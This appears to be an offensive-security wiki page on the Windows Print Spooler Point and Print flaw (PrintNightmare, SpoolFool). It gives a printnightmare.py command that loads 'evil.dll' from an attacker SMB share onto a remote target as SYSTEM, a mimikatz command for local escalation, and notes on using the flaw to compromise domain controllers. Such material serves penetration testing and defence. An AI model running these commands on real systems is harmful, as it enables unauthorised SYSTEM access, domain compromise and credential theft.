---
title: "Point and Print: loading a driver as SYSTEM"
description: "Abusing the Print Spooler's driver installation (RpcAddPrinterDriverEx) and Point and Print to load an attacker-supplied DLL and execute as SYSTEM, both remotely as an authenticated user (PrintNightmare) and locally for privilege escalation."
keywords:
  - PrintNightmare
  - Point and Print
  - RpcAddPrinterDriverEx
  - SpoolFool
  - SYSTEM
---

# Point and Print

**Point and Print** lets a user install a printer and its driver automatically, without admin rights, so the client can print to a shared printer with no manual setup. The spooler's driver-installation path, `RpcAddPrinterDriverEx`, trusts the caller to point at a driver, and a logic flaw let an **unprivileged user supply their own DLL** and have the spooler load it as **SYSTEM**. This is the PrintNightmare class, and it works both **remotely** (as any authenticated user against a remote spooler) and **locally** (for privilege escalation to SYSTEM).

## Remote code execution

```bash
# cube0x0's PrintNightmare exploit: load a DLL from a share onto the remote spooler as SYSTEM
printnightmare.py 'example.local/user:password'@<target> '\\<attacker>\share\evil.dll'
# the DLL is served from an attacker SMB share the target can reach
```

The payload DLL is placed on a reachable share; the spooler copies and executes it, giving code execution as SYSTEM on the target.

## Local privilege escalation

On a host where you already run as a low-privileged user, the same driver-loading path (and later spooler bugs such as SpoolFool, which plants a directory the spooler loads from) escalates to **SYSTEM** locally:

```text
# mimikatz drops the payload and triggers local driver load
misc::printnightmare
# SpoolFool and similar tools exploit the spooler's file handling for local SYSTEM
```

## Exploitation notes

- The remote variant needs only an **authenticated user** and a reachable spooler plus an SMB share the target can read, so it is a strong lateral-movement and DC-compromise primitive where the spooler is exposed.
- Point and Print **hardening** (restricting driver installation to administrators) is the real gate; where it is relaxed for usability, the technique keeps working.
- The payoff is **SYSTEM**, so on a domain controller this is domain compromise and on a workstation it is full local control, including credential theft.
- This is code execution; to merely force authentication for relay, use the [PrinterBug](coercion.md) instead.

## Tools

- **cube0x0's PrintNightmare exploit / Invoke-Nightmare**: remote and local driver-loading execution.
- **mimikatz** (`misc::printnightmare`): local SYSTEM through the spooler.
- **SpoolFool**: spooler file-handling local privilege escalation.

## References

- [itm4n: a practical guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [The Hacker Recipes: PrintNightmare](https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare)
- [SpoolFool (Oliver Lyak)](https://github.com/ly4k/SpoolFool)
